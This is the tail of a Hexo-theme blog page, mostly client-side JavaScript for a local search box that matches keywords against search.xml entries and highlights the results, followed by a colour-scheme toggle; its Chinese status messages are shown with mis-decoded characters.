            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="../../js/colorscheme.js"></script>





        

      </div>
    </div>
  </body>
</html>
